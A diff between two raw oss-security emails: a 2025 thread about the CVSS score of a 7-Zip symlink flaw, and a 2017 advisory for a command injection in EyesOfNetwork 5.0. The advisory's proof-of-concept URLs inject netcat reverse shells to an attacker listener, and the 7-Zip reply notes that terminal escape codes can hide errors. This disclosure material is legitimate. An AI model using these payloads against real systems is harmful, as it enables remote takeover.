@@ -1,4 +1,9 @@
-Received: (qmail 11597 invoked by uid 550); 12 Oct 2025 23:27:54 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4863" "Thursday" "23" "March" "2017" "16:21:31" "+0100" "Sydream Labs" "labs@sysdream.com" "<2d760e44-ac1d-e943-6edd-1c2b2e0118fc@sysdream.com>" "182" "[oss-security] [CVE-2017-6087] EON 5.0 Remote Code Execution" nil nil nil "3" "2017032315:21:31" "[oss-security] [CVE-2017-6087] EON 5.0 Remote Code Execution" (number mark "U       labs@sysdrea Mar 23  182/4863  " thread-indent "\"[oss-security] [CVE-2017-6087] EON 5.0 Remote Code Execution\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 20278 invoked by uid 550); 23 Mar 2017 15:21:46 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,196 +12,206 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 19815 invoked from network); 12 Oct 2025 22:59:49 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1760309980; x=1760914780; darn=lists.openwall.com;
-        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=J1yOLvNXAjS9vIfRe3EA/iWKhqn/5AqDoFaW8XjseyE=;
-        b=g6ZVhfG/WVKTjEPMtKNS2qqjesIZcDkUC73NlzCEbQW645NoZK3e/5DyVPF8pHSnOk
-         7r1e7JKxInE/euJRuEk0Wdt9LMtaEgQMrl9wDyjP7COi0604a8Bq8NKfGxVfXhb5DDjq
-         WRPup/72wocxZxJrAfmoxO4jvYNJKlv29qEXV6NVUR+uKSNW2YeSG+ji+sEQVARgUaWB
-         58lcBVGUTt403PdbUaEkcdwpINGjBBt4U5dKaMXinc2TSS1tk/ucNPZZ/hf8lDOSXGDm
-         8PLSHABNFCtDP4OSDgUpQsW5v5MWccIi62UoSFuFaOGmQHC+pCx/1xQGtp6YHnyo8rHK
-         SIsA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1760309980; x=1760914780;
-        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=J1yOLvNXAjS9vIfRe3EA/iWKhqn/5AqDoFaW8XjseyE=;
-        b=RvFqdAuoZSszGu3Ue9GP6n9/e6rioeZh4LXN4AA6jhxanIQoYTAQapF0+lPu0V5IIT
-         3W/gWytLCk8D+fIncvHXbnWtvAJKcDI76wADgKHbc50ktoTZFzofEThkPei/iwTW6GpQ
-         +twPBuPYN+RgqxWEzjUb3iECRI66yUFHBIAMiPKcdxI5bgUtdHd0eC5wecgqz1TIE8H+
-         ePvbCFV6wN+HDBZESezF97jKyZIvg8HVM1JdbgSoeHYlirkBK3loT7oteJb7vYdY47vj
-         DUMpVS0Up+GCgbUuHI2RCx8Rf7dKpZ3ALC3ZKwxWzy1dfr+LX1mSNQ5HLpVWnZOWUEAi
-         qYXA==
-X-Gm-Message-State: AOJu0YzePqYBXDv0fGNQa00BUuGd/ZhUJMIhmBkEm2YegRY9LJeT4gJA
-	+IKeyJJIG+XZdVrikwxJD4tZIMDMTBs8trAbNqsNzpH5VBLjVaV/aCTutX2gOCO87lmIKbBaIQ4
-	l5SEkPuy+liWIusK9zKJo2taS+JF72vnn69bJ4Cc=
-X-Gm-Gg: ASbGncv1K4ggNWRAuClOWf4iog2fAjNN3IPYKZQwH1kL69Ru2vn7F38d9nuJczCV7VG
-	7ayHw/bkVcXlllFw8UTkW9j/vWNdpVOIR30vFc6gc1Zv8QdYgCeE+QwVGcDeYALqt5s/TqmxNwV
-	YXoOSbree5CT9DmEhPyF794HNQsWM3RXWqEGCs87K5uGk203NLYIQVmAAgNk0IqmC5+CPnug/nw
-	48eKQTH+1ZngNkWXcFZMVqY2ZAuw3e2BwDLvpUdxyDbI9xQSnsa0nai1GY=
-X-Google-Smtp-Source: AGHT+IHtIZ5zFhtlkI2dEZDDiRybP4Hi4NPjhyx9CoYyfQUa+50oDCvbGNdQqotwUau7TcKEDy9cxoNdCeKudR7nNd0=
-X-Received: by 2002:a17:907:1b1f:b0:b3f:fcc7:6ed8 with SMTP id
- a640c23a62f3a-b50aae98249mr1873722166b.29.1760309980063; Sun, 12 Oct 2025
- 15:59:40 -0700 (PDT)
-MIME-Version: 1.0
-References: <CAMqWyhi=xW2sq2+Hb2aJ=ta-zfi_Zay6CztQ9mvDqgjbKr1HpQ@mail.gmail.com>
- <a7169751-2b66-4123-b2b5-09e35623ff80@gmail.com> <CAMqWyhhFgATrYJtxFP-hGLR3FN2XhnvZLHVyNtxpWdAp6fFJNQ@mail.gmail.com>
- <5d16e4d9-a25d-4b5e-946b-4c5243a54bcb@gmail.com> <CAMqWyhgUK+4dW=jxztFYopDxv5apLYsGcWN=1sbfHmmUfePduw@mail.gmail.com>
- <aJxWPAv5ew3BCm+O@adhil>
-In-Reply-To: <aJxWPAv5ew3BCm+O@adhil>
-From: lunbun <lunbun021@gmail.com>
-Date: Sun, 12 Oct 2025 15:59:27 -0700
-X-Gm-Features: AS18NWCocNUL2qe4fd8jihdyyLzMzYjGJWXbI81p6q7RxfXNE070vqgrWPnzUBo
-Message-ID: <CAMqWyhgY=k3h8mKmjPiy-K6mBHjmjW_gMbJ+yn9H=YLyKKHrsA@mail.gmail.com>
+Received: (qmail 20200 invoked from network); 23 Mar 2017 15:21:45 -0000
+DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 29A521A0D4A
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
+	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1490282493;
+	bh=9243A5QWWgw9NHL69L2wKviLK6zeM8gnJgZlsFBKroE=;
+	h=From:Subject:To:Message-ID:Date:MIME-Version:Content-Type;
+	b=GkwOC+1zI0hbxVC3xybgPpRpR6o5VgIQrfNPPa61flAAB9l/wiiZcb/edyMZ6n9Fc
+	 xPNBkE9ItbyVeg7JEVIgnjVOf81TgCdTjoEn3dS0HZgWUWG+bPQ1eRuqVIOgEfT0vn
+	 QUBlpH7+d62Jn0tCufr8IUY47LCNAouncl1X5i0w=
+From: Sydream Labs <labs@sysdream.com>
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="0000000000000e6de20640fe1bfd"
-Subject: Re: [oss-security] CVE-2025-55188: 7-Zip: Arbitrary file write on
- extraction, may lead to code execution
+Message-ID: <2d760e44-ac1d-e943-6edd-1c2b2e0118fc@sysdream.com>
+Date: Thu, 23 Mar 2017 16:21:31 +0100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+ Thunderbird/45.8.0
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="mWFejrWsg1eve5VvOimx1ht1lglXQa6im"
+Subject: [oss-security] [CVE-2017-6087] EON 5.0 Remote Code Execution
 
---0000000000000e6de20640fe1bfd
-Content-Type: text/plain; charset="UTF-8"
+--mWFejrWsg1eve5VvOimx1ht1lglXQa6im
+Content-Type: multipart/mixed; boundary="6pRXxWHNWqKdEmorkSJ2k3Ix2XqJoTGjh";
+ protected-headers="v1"
+From: Sydream Labs <labs@sysdream.com>
+To: oss-security@lists.openwall.com
+Message-ID: <2d760e44-ac1d-e943-6edd-1c2b2e0118fc@sysdream.com>
+Subject: [CVE-2017-6087] EON 5.0 Remote Code Execution
+
+--6pRXxWHNWqKdEmorkSJ2k3Ix2XqJoTGjh
+Content-Type: text/plain; charset=utf-8
 Content-Transfer-Encoding: quoted-printable
 
-Hi all,
+# [CVE-2017-6087] EON 5.0 Remote Code Execution
 
-Does anyone know how might I get the CVSS score of this vulnerability
-(CVE-2025-55188) increased?
+## Description
 
-I recently saw an advisory for CVE-2025-11001, a very similar
-arbitrary file write in 7-Zip due to symbolic links
-(https://www.zerodayinitiative.com/advisories/ZDI-25-949/).
+EyesOfNetwork ("EON") is an OpenSource network monitoring solution.
 
-However, CVE-2025-11001 is clearly different from CVE-2025-55188,
-as the advisory states that CVE-2025-11001 was patched in 25.00.
-My proof-of-concept symbolic link attack for CVE-2025-55188 works in
-version 25.00.
+## Remote Code Execution (authenticated)
 
-I am concerned that due to the low CVSS score of CVE-2025-55188, most users
-do not realize that 25.00 is still vulnerable to symbolic link attacks.
+The Eonweb code does not correctly filter arguments, allowing
+authenticated users to execute arbitrary code.
 
-I've already tried contacting MITRE 8 times to update the description
-and CVSS score. I've only received one response, and that was that
-not enough public information was available.
+**CVE ID**: CVE-2017-6087
 
-I then published a proof-of-concept and vulnerability explanation
-(https://github.com/lunbun/CVE-2025-55188 and
-https://lunbun.dev/blog/cve-2025-55188/), but MITRE is still unresponsive
-to my update requests.
+**Access Vector**: remote
 
-I suspect that MITRE is just busy with a huge backlog of CVE requests,
-but I am not sure what to do here. If anyone could offer any advice,
-I'd greatly appreciate it.
+**Security Risk**: high
 
-Thanks,
-lunbun
+**Vulnerability**: CWE-78
 
-On Wed, Aug 13, 2025 at 3:00=E2=80=AFAM Jens-Wolfhard Schicke-Uffmann <
-drahflow@gmx.de> wrote:
+**CVSS Base Score**: 7.6
 
-> On Sun, Aug 10, 2025 at 05:04:24PM -0700, lunbun wrote:
-> > If a symlink targets a nonexistent directory, the write will fail. 7-Zip
-> by
-> > default will print an error message, like:
-> > ```
-> > ERROR: Cannot open output file : errno=3D2 : No such file or directory =
-: ./
-> > malicious_link/file.txt
-> > ```
-> >
-> > This applies similarly to other filesystem errors, like insufficient
-> > permissions or unwritable directory.
-> >
-> > However, 7-Zip by default continues with extraction regardless of the
-> error,
-> > which is why an attacker can use this "shotgun" strategy. These errors,
-> though,
-> > would hopefully help notify the user that something suspicious is
-> happening.
-> Never forget terminal escape codes. At least the 7-Zip my debian
-> has dumps the raw filename in those error messages. This allows an attack=
-er
-> to clean the specific error lines after they have been output (with
-> another, later filename containing the required escapes).
->
-> With some fantasy, it might also be possible to massage the overwrite
-> prompts (they're also unescaped) into suggesting to choose "(A)lways",
-> e.g. by good cursor movement and setting a scroll region far above for
-> the real prompt.
->
->
-> Regards,
->   Drahflow
->
+**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
 
---0000000000000e6de20640fe1bfd
-Content-Type: text/html; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
 
-<div dir=3D"ltr">Hi all,<br><br>Does anyone know how might I get the CVSS s=
-core of this vulnerability<br>(CVE-2025-55188) increased?<br><br>I recently=
- saw an advisory for CVE-2025-11001, a very similar<br>arbitrary file write=
- in 7-Zip due to symbolic links<br>(<a href=3D"https://www.zerodayinitiativ=
-e.com/advisories/ZDI-25-949/">https://www.zerodayinitiative.com/advisories/=
-ZDI-25-949/</a>).<br><br>However, CVE-2025-11001 is clearly different from =
-CVE-2025-55188,<br>as the advisory states that CVE-2025-11001 was patched i=
-n 25.00.<br>My proof-of-concept symbolic link attack for CVE-2025-55188 wor=
-ks in<br>version 25.00.<br><br>I am concerned that due to the low CVSS scor=
-e of CVE-2025-55188, most users<br>do not realize that 25.00 is still vulne=
-rable to symbolic link attacks.<br><br>I&#39;ve already tried contacting MI=
-TRE 8 times to update the description<br>and CVSS score. I&#39;ve only rece=
-ived one response, and that was that<br>not enough public information was a=
-vailable.<br><br>I then published a proof-of-concept and vulnerability expl=
-anation<br>(<a href=3D"https://github.com/lunbun/CVE-2025-55188">https://gi=
-thub.com/lunbun/CVE-2025-55188</a> and <br><a href=3D"https://lunbun.dev/bl=
-og/cve-2025-55188/">https://lunbun.dev/blog/cve-2025-55188/</a>), but MITRE=
- is still unresponsive<br>to my update requests.<br><br>I suspect that MITR=
-E is just busy with a huge backlog of CVE requests,<br>but I am not sure wh=
-at to do here. If anyone could offer any advice,<br>I&#39;d greatly appreci=
-ate it.<br><br>Thanks,<br>lunbun</div><br><div class=3D"gmail_quote gmail_q=
-uote_container"><div dir=3D"ltr" class=3D"gmail_attr">On Wed, Aug 13, 2025 =
-at 3:00=E2=80=AFAM Jens-Wolfhard Schicke-Uffmann &lt;<a href=3D"mailto:drah=
-flow@gmx.de">drahflow@gmx.de</a>&gt; wrote:<br></div><blockquote class=3D"g=
-mail_quote" style=3D"margin:0px 0px 0px 0.8ex;border-left:1px solid rgb(204=
-,204,204);padding-left:1ex">On Sun, Aug 10, 2025 at 05:04:24PM -0700, lunbu=
-n wrote:<br>
-&gt; If a symlink targets a nonexistent directory, the write will fail. 7-Z=
-ip by<br>
-&gt; default will print an error message, like:<br>
-&gt; ```<br>
-&gt; ERROR: Cannot open output file : errno=3D2 : No such file or directory=
- : ./<br>
-&gt; malicious_link/file.txt<br>
-&gt; ```<br>
-&gt; <br>
-&gt; This applies similarly to other filesystem errors, like insufficient<b=
-r>
-&gt; permissions or unwritable directory.<br>
-&gt; <br>
-&gt; However, 7-Zip by default continues with extraction regardless of the =
-error,<br>
-&gt; which is why an attacker can use this &quot;shotgun&quot; strategy. Th=
-ese errors, though,<br>
-&gt; would hopefully help notify the user that something suspicious is happ=
-ening.<br>
-Never forget terminal escape codes. At least the 7-Zip my debian<br>
-has dumps the raw filename in those error messages. This allows an attacker=
-<br>
-to clean the specific error lines after they have been output (with<br>
-another, later filename containing the required escapes).<br>
-<br>
-With some fantasy, it might also be possible to massage the overwrite<br>
-prompts (they&#39;re also unescaped) into suggesting to choose &quot;(A)lwa=
-ys&quot;,<br>
-e.g. by good cursor movement and setting a scroll region far above for<br>
-the real prompt.<br>
-<br>
-<br>
-Regards,<br>
-=C2=A0 Drahflow<br>
-</blockquote></div>
+### Proof of Concept 1
 
---0000000000000e6de20640fe1bfd--
+On the attacker's host, we start a handler:
+
+```
+nc -lvp 1337
+```
+
+The `selected_events` parameter is not correctly filtered before it is
+used by the `shell_exec()` function.
+
+There, it is possible to inject a payload like in the request below,
+where we connect back to our handler:
+
+```
+https://eonweb.local/module/monitoring_ged/ged_actions.php?queue=3Dhistory&=
+action=3Dconfirm&global_action=3D4&selected_events%5B%5D=3D;nc%2010.0.5.124=
+%201337%20-e%20/bin/bash;
+```
+
+#### Vulnerable code
+
+The payload gets injected into the `$event[$key]` and `$ged_command`
+variables of the `module/monitoring_ged/ged_functions.php` file, line 373:
+
+```
+$ged_command =3D "-update -type $ged_type_nbr ";
+foreach ($array_ged_packets as $key =3D> $value) {
+  if($value["type"] =3D=3D true){
+    if($key =3D=3D "owner"){
+      $event[$key] =3D $owner;
+    }
+    $ged_command .=3D "\"".$event[$key]."\" ";
+  }
+}
+$ged_command =3D trim($ged_command, " ");
+shell_exec($path_ged_bin." ".$ged_command);
+```
+
+Two other functions in this file are also affected by this problem:
+
+* `delete($selected_events, $queue);`
+* `ownDisown($selected_events, $queue, $global_action);`
+
+
+### Proof of Concept 2
+
+On the attacker's host, we start a handler:
+
+```
+nc -lvp 1337
+```
+
+The `module` parameter is not correctly filtered before it is used by
+the `shell_exec()` function.
+
+Again, we inject our connecting back payload:
+
+```
+https://eonweb.local/module/index.php?module=3D|nc%20192.168.1.14%201337%20=
+-e%20/bin/bash&link=3Dpadding
+```
+
+#### Vulnerable code
+
+In the `module/index.php` file, line 24, we can see that our payload is
+injected into the `exec()` function without any sanitization:
+
+```
+# Check optionnal module to load
+if(isset($_GET["module"]) && isset($_GET["link"])) {
+
+	$module=3Dexec("rpm -q ".$_GET["module"]." |grep '.eon' |wc -l");
+
+	# Redirect to module page if rpm installed
+	if($module!=3D0) { header('Location: '.$_GET["link"].''); }
+
+}
+```
+
+
+## Timeline (dd/mm/yyyy)
+
+* 01/10/2016 : Initial discovery.
+* 09/10/2016 : Fisrt contact with vendor.
+* 23/10/2016 : Technical details sent to the security contact.
+* 27/10/2016 : Vendor akwnoledgement and first patching attempt.
+* 11/10/2016 : Testing the patch revealed that it needed more work.
+* 16/02/2017 : New tests done on release candidate 5.1. Fix confirmed.
+* 26/02/2017 : 5.1 release. Waiting for 2 weeks according to our
+repsonsible disclosure agreement.
+* 14/03/2017 : Public disclosure.
+
+Thank you to EON for the fast response.
+
+## Solution
+
+Update to version 5.1
+
+## Affected versions
+
+* Version <=3D 5.0
+
+## Credits
+
+* Nicolas SERRA <n.serra@sysdream.com>
+
+--=20
+SYSDREAM Labs <labs@sysdream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+
+
+--6pRXxWHNWqKdEmorkSJ2k3Ix2XqJoTGjh--
+
+--mWFejrWsg1eve5VvOimx1ht1lglXQa6im
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
+
+iQIvBAEBCAAZBQJY0+f8EhxsYWJzQHN5c2RyZWFtLmNvbQAKCRCOtIzZ1bJZoe5p
+EAC6fYCptLg87hRfURRt8kuZMbBydkKkmB5Xe2qcvx66qIfnGUlP085nFMDm+NYp
+cGN3M/HXVue9IM7BEtw9ioij7q+gLUWQizMdePGhcxcRUb9Oj6jbnfAmU9ICWp+K
+l5dBFaNMVV5Oi7QmpSTZKYTV49FVmz9CWpZE70Y6j9j65TZXZH3IlVe7sOLVGm1Y
+YbNpR4hZaDy6XXZIpl8YWuGzXAbSi+4AvhYao7lTGH2Sb2cFNF5mrhOS6y7h6myo
+yoVKQXFpx7mK8ognYOIW1EJPJ+hAPImRtWIIUETIufF8aN8gSXgBhxnnVKODQeeL
+XdmWiLGvpyHfRIFDUchGFpC5FdWFFO3vjMlSbBO3/4wVkh9MGHP0mCdOAyvFVIwn
+h3wRGXFSKqGEUb9vCGy/En8L70/s08iLN6Cc0w15E3E0M0iR17zd8PV3iiJeUi2m
+164TBjjyDrNTUU7Q9WYRLkctM2KzQDjsdklu140I3qxPuslQTCv5Z7P+yf3Ok6oo
+kYrma74yTTUSis61mNh1g5FA0AUQ/YNOq78yLXybrnSpL1lZOurAWESbMxTnPUSf
+YR2CKfsUDpm3tp/glyXtHjNtsOY1wsn9+OjvT5qN3BEx1mquffyLvhM7wQC3AzEN
+1t0xAaguKVtd1jrJlOO2yHfct1IGDvrCpHWb1ym844dJyQ==
+=qKHs
+-----END PGP SIGNATURE-----
+
+--mWFejrWsg1eve5VvOimx1ht1lglXQa6im--
